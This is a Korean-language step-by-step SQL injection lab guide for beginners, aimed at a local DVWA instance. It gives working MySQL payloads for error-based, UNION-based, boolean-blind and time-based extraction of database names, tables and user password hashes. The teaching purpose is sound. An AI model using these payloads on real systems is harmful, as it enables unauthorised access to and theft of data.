SQL Injection 실습 가이드

이 가이드는 SQL Injection을 처음 배우는 초보자를 위한 단계별 실습 문서입니다. 각 기법의 논리 구조와 왜 그렇게 공격하는지를 중심으로 설명합니다.

실습 환경 준비​

1. DVWA 설치 (Docker 사용)​

**DVWA (Damn Vulnerable Web Application)**는 가장 널리 사용되는 취약한 웹 애플리케이션 실습 환경입니다.

# Docker로 DVWA 실행
docker run -d -p 80:80 vulnerables/web-dvwa

# 웹 브라우저에서 접속
# http://localhost

# 기본 로그인 정보
# Username: admin
# Password: password

초기 설정:

  1. 로그인 후 Setup / Reset DB 클릭
  2. Create / Reset Database 클릭
  3. 다시 로그인
  4. 좌측 메뉴에서 DVWA Security → Low 선택

2. 브라우저 개발자 도구 활용​

Chrome/Edge: F12 키 Firefox: F12 키

Network 탭 활용:

  • 모든 HTTP 요청/응답 확인
  • Content-Length (페이지 크기) 확인
  • 응답 시간 측정

실습 1: Error-based SQL Injection​

목표​

에러 메시지를 통해 데이터베이스 정보 추출

왜 Error-based부터 시작하는가?​

  • 가장 직관적이고 이해하기 쉬움
  • 에러 메시지에서 직접 결과를 볼 수 있음
  • 빠른 정보 수집 가능

실습 단계​

1단계: 취약점 탐지

DVWA의 SQL Injection 메뉴 이동

User ID: 1

→ 정상 사용자 정보 표시

User ID: 1'

→ SQL 에러 발생

에러 메시지 분석:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1

의미:

  • MySQL을 사용하고 있음
  • 싱글쿼트(')로 SQL 문법을 깨뜨림
  • SQL Injection 취약

2단계: 데이터베이스 버전 확인

논리: extractvalue 함수는 XPATH 에러를 일으키면서 우리가 원하는 데이터를 에러 메시지에 포함시킴

User ID: 1' AND extractvalue(1, concat(0x7e, version(), 0x7e))--

왜 이렇게 작성하는가?

  • extractvalue(1, ...): XPATH 함수 호출
  • concat(0x7e, version(), 0x7e): '' + MySQL버전 + '' 조합
  • 0x7e: 틸드(~) 문자의 16진수 (데이터를 눈에 띄게 하기 위함)
  • --: SQL 주석 (뒤의 코드 무시)

에러 메시지:

XPATH syntax error: '~5.7.31-0ubuntu0.18.04.1~'

결과: MySQL 버전은 5.7.31

3단계: 데이터베이스명 확인

User ID: 1' AND extractvalue(1, concat(0x7e, database(), 0x7e))--

에러 메시지:

XPATH syntax error: '~dvwa~'

결과: 현재 DB명은 dvwa

4단계: 테이블명 확인

논리: information_schema는 MySQL의 메타데이터 저장소로, 모든 테이블/컬럼 정보가 있음

User ID: 1' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1), 0x7e))--

왜 LIMIT 0,1을 사용하는가?

  • extractvalue는 단일 값만 반환 가능
  • 여러 행을 반환하면 에러 발생
  • LIMIT 0,1: 첫 번째 행만 가져옴

에러 메시지:

XPATH syntax error: '~users~'

결과: 첫 번째 테이블은 users

5단계: 컬럼명 확인

User ID: 1' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))--

에러 메시지:

XPATH syntax error: '~user_id~'

다른 컬럼 확인 (LIMIT 1,1은 두 번째 행):

User ID: 1' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1), 0x7e))--

결과: first_name, last_name, user, password 등

6단계: 데이터 추출

User ID: 1' AND extractvalue(1, concat(0x7e, (SELECT user FROM users LIMIT 0,1), 0x7e))--

에러 메시지:

XPATH syntax error: '~admin~'

실습 정리​

Error-based의 핵심 논리:

1. 에러 메시지가 표시되는가? → Error-based 가능
2. extractvalue/updatexml 함수로 의도적 에러 유발
3. 서브쿼리 결과를 에러 메시지에 포함
4. LIMIT으로 한 행씩 추출

실습 2: Union-based SQL Injection​

목표​

UNION 연산자를 사용하여 대량 데이터 추출

왜 Union-based를 사용하는가?​

  • Error-based보다 더 많은 데이터를 한 번에 추출
  • 테이블 전체를 덤프 가능
  • 가장 강력하고 빠른 기법

실습 단계​

1단계: 컬럼 수 파악

논리: ORDER BY는 n번째 컬럼으로 정렬하는데, 없는 컬럼 번호를 지정하면 에러 발생

User ID: 1' ORDER BY 1--

→ 정상

User ID: 1' ORDER BY 2--

→ 정상

User ID: 1' ORDER BY 3--

→ 에러 발생

왜 ORDER BY로 컬럼 수를 알 수 있는가?

-- 원본 쿼리 추정
SELECT first_name, last_name FROM users WHERE user_id='1'

-- ORDER BY 3을 추가하면
SELECT first_name, last_name FROM users WHERE user_id='1' ORDER BY 3
→ 3번째 컬럼이 없으므로 에러

결론: 컬럼 수는 2개

2단계: UNION SELECT 테스트

논리: UNION은 두 쿼리의 컬럼 수가 같아야 함

User ID: 1' UNION SELECT NULL, NULL--

→ 정상 작동

왜 NULL을 사용하는가?

  • NULL은 모든 데이터 타입과 호환됨
  • 숫자, 문자열을 사용하면 타입 불일치 에러 가능

3단계: 출력 위치 파악

User ID: 1' UNION SELECT 1, 2--

페이지 출력:

ID: 1
First name: 1
Surname: 2

결론:

  • 첫 번째 컬럼: First name 위치에 출력
  • 두 번째 컬럼: Surname 위치에 출력

4단계: 데이터베이스 정보 수집

User ID: 1' UNION SELECT database(), version()--

출력:

First name: dvwa
Surname: 5.7.31-0ubuntu0.18.04.1

5단계: 테이블명 한 번에 추출

논리: GROUP_CONCAT은 여러 행을 하나의 문자열로 합침

User ID: 1' UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='dvwa'--

출력:

Surname: guestbook,users

왜 GROUP_CONCAT을 사용하는가?

  • 여러 테이블명을 한 번에 볼 수 있음
  • 일일이 LIMIT으로 한 행씩 보는 것보다 효율적

6단계: 컬럼명 추출

User ID: 1' UNION SELECT NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--

출력:

Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login

7단계: 사용자 데이터 추출

User ID: 1' UNION SELECT user, password FROM users--

출력:

First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

모든 사용자 한 번에 보기:

User ID: 1' UNION SELECT NULL, GROUP_CONCAT(user, ':', password) FROM users--

출력:

Surname: admin:5f4dcc3b5aa765d61d8327deb882cf99,gordonb:e99a18c428cb38d5f260853678922e03,...

실습 정리​

Union-based의 핵심 논리:

1. ORDER BY로 컬럼 수 파악 (필수)
2. UNION SELECT NULL,NULL,... 로 컬럼 수 맞춤
3. 출력 위치 파악 (UNION SELECT 1,2,3,...)
4. information_schema로 테이블/컬럼 정보 수집
5. GROUP_CONCAT으로 대량 데이터 한 번에 추출

실습 3: Boolean-based Blind SQL Injection​

목표​

페이지 응답 차이를 이용하여 데이터 추론

왜 Boolean-based를 사용하는가?​

  • 에러 메시지가 숨겨진 경우
  • 쿼리 결과가 페이지에 출력되지 않는 경우
  • 페이지 내용이 참/거짓에 따라 달라질 때

DVWA 설정 변경​

DVWA Security → Medium 선택 (에러 메시지 숨김)

실습 단계​

1단계: 참/거짓 응답 차이 확인

참 조건:

User ID: 1' AND '1'='1

→ 사용자 정보 표시 (페이지 길이: 약 2000 bytes)

거짓 조건:

User ID: 1' AND '1'='2

→ 빈 페이지 (페이지 길이: 약 500 bytes)

논리:

AND '1'='1' → 항상 참 → 원본 쿼리 결과 유지
AND '1'='2' → 항상 거짓 → 결과 없음

결론: 페이지 응답이 다름 → Boolean-based 가능

2단계: 데이터베이스명 길이 확인

User ID: 1' AND LENGTH(database())=1--

→ 빈 페이지 (거짓)

User ID: 1' AND LENGTH(database())=4--

→ 사용자 정보 표시 (참)

왜 길이부터 확인하는가?

  • 전체 문자열을 비교하는 것보다 효율적
  • 반복 횟수를 미리 알 수 있음

결론: DB명은 4글자

3단계: 첫 글자 추출

User ID: 1' AND SUBSTRING(database(), 1, 1)='a'--

→ 빈 페이지 (거짓)

User ID: 1' AND SUBSTRING(database(), 1, 1)='d'--

→ 사용자 정보 표시 (참)

SUBSTRING 함수 이해:

SUBSTRING(database(), 1, 1)
           └──────┬──────┘  │  │
                  │         │  └─ 길이: 1글자
                  │         └─ 시작 위치: 1번째
                  └─ 대상: database()

결론: 첫 글자는 'd'

4단계: 두 번째 글자 추출

User ID: 1' AND SUBSTRING(database(), 2, 1)='v'--

→ 사용자 정보 표시 (참)

결론: 두 번째 글자는 'v'

5단계: 세 번째, 네 번째 글자 추출

User ID: 1' AND SUBSTRING(database(), 3, 1)='w'--

→ 참

User ID: 1' AND SUBSTRING(database(), 4, 1)='a'--

→ 참

최종 결과: DB명은 dvwa

효율적인 방법: ASCII 이진 탐색​

논리: 문자를 하나씩 비교하는 대신 ASCII 코드 범위로 좁히기

-- 'd'의 ASCII는 100
User ID: 1' AND ASCII(SUBSTRING(database(), 1, 1)) > 50--

→ 참 (50보다 큼)

User ID: 1' AND ASCII(SUBSTRING(database(), 1, 1)) > 100--

→ 거짓 (50~100 사이)

User ID: 1' AND ASCII(SUBSTRING(database(), 1, 1)) > 75--

→ 참 (75~100 사이)

User ID: 1' AND ASCII(SUBSTRING(database(), 1, 1)) = 100--

→ 참 (ASCII 100 = 'd')

왜 이진 탐색이 효율적인가?

26개 알파벳 일일이 비교: 평균 13번
이진 탐색: 평균 7~8번

실습 정리​

Boolean-based의 핵심 논리:

1. 참/거짓 응답 차이 확인 (필수)
2. LENGTH()로 데이터 길이 파악
3. SUBSTRING()으로 한 글자씩 추출
4. ASCII + 이진 탐색으로 최적화
5. 반복하여 전체 문자열 완성

실습 4: Time-based Blind SQL Injection​

목표​

시간 지연을 이용하여 데이터 추론

왜 Time-based를 사용하는가?​

  • 페이지 응답이 항상 동일할 때
  • Boolean-based로 차이를 판단할 수 없을 때
  • 최후의 수단 (가장 느리지만 가장 범용적)

DVWA 설정 변경​

DVWA Security → High 선택

실습 단계​

1단계: 시간 지연 테스트

User ID: 1' AND SLEEP(5)--

Network 탭 확인:

  • 응답 시간: 약 5초

논리: SLEEP(5)는 데이터베이스를 5초간 멈춤

결론: Time-based SQLi 취약

2단계: 조건부 시간 지연

참 조건:

User ID: 1' AND IF(1=1, SLEEP(5), 0)--

→ 5초 지연 (1=1은 참이므로 SLEEP 실행)

거짓 조건:

User ID: 1' AND IF(1=2, SLEEP(5), 0)--

→ 즉시 응답 (1=2는 거짓이므로 SLEEP 건너뜀)

IF 함수 이해:

IF(조건, 참일때실행, 거짓일때실행)

3단계: 데이터베이스명 길이 확인

User ID: 1' AND IF(LENGTH(database())=4, SLEEP(3), 0)--

→ 3초 지연 (참)

왜 5초가 아닌 3초를 사용하는가?

  • 실습 시간 단축
  • 네트워크 지연(0.1~0.5초)과 구분하기에 충분

결론: DB명은 4글자

4단계: 첫 글자 추출

User ID: 1' AND IF(SUBSTRING(database(), 1, 1)='d', SLEEP(3), 0)--

→ 3초 지연 (참)

결론: 첫 글자는 'd'

5단계: 이진 탐색으로 효율화

-- ASCII가 100보다 큰가?
User ID: 1' AND IF(ASCII(SUBSTRING(database(), 1, 1))>100, SLEEP(3), 0)--

→ 즉시 응답 (거짓, 100 이하)

-- ASCII가 100인가?
User ID: 1' AND IF(ASCII(SUBSTRING(database(), 1, 1))=100, SLEEP(3), 0)--

→ 3초 지연 (참, 100 = 'd')

실습 정리​

Time-based의 핵심 논리:

1. SLEEP() 함수로 시간 지연 테스트
2. IF() 함수로 조건부 지연 구현
3. LENGTH()로 길이 파악
4. SUBSTRING() + ASCII 이진 탐색
5. 응답 시간 차이로 참/거짓 판단

트러블슈팅​

DVWA가 작동하지 않음​

# Docker 컨테이너 재시작
docker ps -a  # 컨테이너 ID 확인
docker restart <container_id>

# 또는 새로 설치
docker rm -f <container_id>
docker run -d -p 80:80 vulnerables/web-dvwa

Error-based가 작동하지 않음​

  • DVWA Security 레벨을 "Low"로 설정
  • MySQL 에러 표시 활성화

Union-based에서 타입 에러 발생​

  • NULL 사용 (숫자, 문자열 대신)
  • CAST() 함수로 타입 변환

Time-based가 너무 느림​

  • SLEEP(5) 대신 SLEEP(2) 사용
  • ASCII 이진 탐색 활용
  • SQLMap 자동화 도구 사용
